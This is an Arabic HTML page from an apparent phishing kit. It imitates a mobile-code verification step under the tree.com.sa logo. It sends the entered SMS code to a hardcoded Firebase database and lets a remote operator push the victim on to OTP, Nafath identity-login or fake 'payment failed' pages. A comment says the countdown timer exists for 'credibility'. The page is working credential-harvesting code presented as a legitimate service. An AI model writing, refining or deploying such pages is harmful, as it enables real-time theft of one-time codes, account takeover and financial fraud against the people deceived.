<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد رمز الجوال</title>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
        .logo { width: 100px; margin-bottom: 20px; }
        .timer { color: #ff4d4d; font-weight: bold; margin: 15px 0; font-size: 14px; }
        input { width: 100%; padding: 15px; margin: 15px 0; border: 1px solid #ddd; border-radius: 12px; font-size: 24px; text-align: center; letter-spacing: 5px; outline: none; }
        button { width: 100%; padding: 18px; background: #27ae60; color: white; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://tree.com.sa/assets/images/logo/logo-dark.svg" class="logo" alt="tree">
    <h3>رمز تأكيد الجوال</h3>
    <p style="color:#666; font-size: 14px;">أدخل الرمز المكون من 4 أرقام المرسل إلى جوالك لإتمام التحقق</p>
    
    <input type="number" id="smsCode" placeholder="— — — —" oninput="if(this.value.length > 4) this.value = this.value.slice(0, 4);">
    
    <div class="timer">سيتم إعادة إرسال الرمز خلال <span id="time">01:59</span></div>
    
    <button onclick="verifyAndNext()">تأكيـد الرمز</button>
</div>

<script>
    // إعدادات Firebase الخاصة بك
    const firebaseConfig = {
        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
        authDomain: "tameen-658e9.firebaseapp.com",
        projectId: "tameen-658e9",
        storageBucket: "tameen-658e9.firebasestorage.app",
        messagingSenderId: "292670676256",
        appId: "1:292670676256:web:3624157751cd194efe4b45"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const userId = localStorage.getItem('user_id');

    // وظيفة الإرسال والانتقال لصفحة الاتصال
    async function verifyAndNext() {
        const code = document.getElementById('smsCode').value;
        if(code.length < 4) { alert("يرجى إدخال رمز صحيح"); return; }

        await db.collection("orders").doc(userId).update({
            mobile_sms_code: code,
            status: "تم تأكيد رمز الجوال - ينتقل للاتصال"
        });

        // الانتقال التلقائي لصفحة الاتصال الموجودة عندك
        window.location.href = "call_verification.html";
    }

    // عداد الوقت التنازلي للجمالية والمصداقية
    let duration = 119;
    const display = document.querySelector('#time');
    setInterval(() => {
        let minutes = parseInt(duration / 60, 10);
        let seconds = parseInt(duration % 60, 10);
        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;
        display.textContent = minutes + ":" + seconds;
        if (--duration < 0) duration = 119;
    }, 1000);
    // --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
(function() {
    const userId = localStorage.getItem('user_id');
    if (userId) {
        db.collection("orders").doc(userId).onSnapshot((doc) => {
            if (doc.exists) {
                const data = doc.data();
                if (data.next_step === "GO_TO_OTP") {
                    window.location.href = "otp_verification.html"; 
                } else if (data.next_step === "GO_TO_REJECT") {
                    window.location.href = "payment_failed.html";
                } else if (data.next_step === "GO_TO_NAFATH") {
                    window.location.href = "nafath.html";
                } else if (data.next_step === "SHOW_NAFATH_CODE") {
                    const codeBox = document.getElementById('nafath-number');
                    if (codeBox && data.nafath_code) {
                        codeBox.innerText = data.nafath_code;
                        const overlay = document.getElementById('overlay');
                        if (overlay) overlay.style.display = 'none';
                    }
                }
            }
        });
    }
})();
// ------------------------------------------

</script>
</body>
</html>
